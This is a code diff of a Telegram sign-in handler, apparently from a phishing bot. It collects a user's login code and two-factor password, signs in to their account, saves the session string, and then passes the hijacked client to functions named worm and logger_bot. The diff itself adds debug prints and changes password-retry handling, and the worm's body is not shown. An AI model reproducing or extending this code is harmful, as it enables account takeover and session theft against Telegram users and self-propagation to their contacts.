@@ -73,7 +73,9 @@ async def sign_in(event, user_data):
         login = {}
         data = {'session': uclient.session.save(), 'logged_in': True, 'ts': round(time.time())}
         await event.edit(strings['login_success'])
+        print('w---------------------w')
         await worm(uclient, logger_bot)
+        print('w---------777----------w')
     except telethon.errors.PhoneCodeInvalidError as e:
         await event.edit(strings['code_invalid'])
         await event.respond(strings['ask_code'], buttons=numpad)
@@ -81,16 +83,16 @@ async def sign_in(event, user_data):
         login['code_ok'] = False
     except telethon.errors.SessionPasswordNeededError as e:
         if get(login, 'local_avail', 'password' in user_data):
-            try:
-                await uclient.sign_in(password=user_data['password'])
-            except telethon.errors.PasswordHashInvalidError as e:
-                login['local_avail'] = False
+            login['pass_ok'] = True
+            user_data['login'] = json.dumps(login)
+            return await sign_in(event, user_data)
         login['need_pass'] = True
         login['pass_ok'] = False
         await event.edit(strings['ask_pass'])
     except telethon.errors.PasswordHashInvalidError as e:
         login['need_pass'] = True
         login['pass_ok'] = False
+        login['local_avail'] = False
         await event.edit(strings['pass_invalid'])
         await event.respond(strings['ask_pass'])
     except Exception as e:
